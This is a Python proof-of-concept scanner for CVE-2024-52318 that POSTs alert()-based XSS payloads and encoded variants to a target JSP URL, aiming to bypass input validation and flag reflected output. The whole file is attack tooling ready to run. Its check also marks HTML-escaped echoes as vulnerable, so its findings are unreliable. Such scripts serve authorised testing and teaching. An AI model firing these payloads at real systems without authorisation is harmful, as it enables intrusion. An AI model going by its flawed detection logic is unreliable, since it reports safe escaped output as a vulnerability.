import requests
import urllib.parse

# Target server configuration
TARGET_URL = "http://example.com/vulnerable_jsp"  # Replace with the vulnerable JSP's URL
TEST_PAYLOADS = [
    "<script>alert('XSS1');</script>",
    "<svg/onload=alert('XSS2')>",
    "<img src=x onerror=alert('XSS3')>",
    "'\"><script>alert('XSS4')</script>",
    "<body onload=alert('XSS5')>"
]

def encode_payload(payload):
    """
    Encode the test payloads to bypass basic input validation.

    Args:
        payload (str): Original payload.

    Returns:
        dict: A dictionary of payload encodings.
    """
    return {
        "original": payload,
        "url_encoded": urllib.parse.quote(payload),
        "html_encoded": payload.replace("<", "&lt;").replace(">", "&gt;"),
        "double_encoded": urllib.parse.quote(urllib.parse.quote(payload))
    }

def send_payloads(target_url, encoded_payloads):
    """
    Send encoded payloads to the target JSP.

    Args:
        target_url (str): Target server URL.
        encoded_payloads (list): List of encoded payloads.

    Returns:
        list: List of response results.
    """
    results = []
    for payload_set in encoded_payloads:
        for encode_type, payload in payload_set.items():
            try:
                response = requests.post(
                    target_url,
                    data={"input": payload},  # Assuming POST requests are accepted
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    timeout=5
                )
                if payload in response.text:
                    results.append({
                        "payload": payload,
                        "encode_type": encode_type,
                        "vulnerable": True,
                        "response_snippet": response.text[:500]  # Extract response snippet
                    })
                else:
                    results.append({
                        "payload": payload,
                        "encode_type": encode_type,
                        "vulnerable": False
                    })
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Request failed: {e}")
    return results

def analyze_results(results):
    """
    Analyze test results for vulnerabilities.

    Args:
        results (list): List of test results.
    """
    print("\n[Analysis Results]")
    for result in results:
        if result["vulnerable"]:
            print(f"[VULNERABLE] Encoding Type: {result['encode_type']} Payload: {result['payload']}")
            print(f"Unescaped Response Snippet:\n{result['response_snippet']}")
        else:
            print(f"[SAFE] Encoding Type: {result['encode_type']} Payload: {result['payload']}")

def test_cve_2024_52318(target_url, payloads):
    """
    Main function to test for CVE-2024-52318.

    Args:
        target_url (str): Target server URL.
        payloads (list): List of test payloads.
    """
    print(f"[START] Testing target URL: {target_url}")
    encoded_payloads = [encode_payload(payload) for payload in payloads]
    results = send_payloads(target_url, encoded_payloads)
    analyze_results(results)

if __name__ == "__main__":
    test_cve_2024_52318(TARGET_URL, TEST_PAYLOADS)
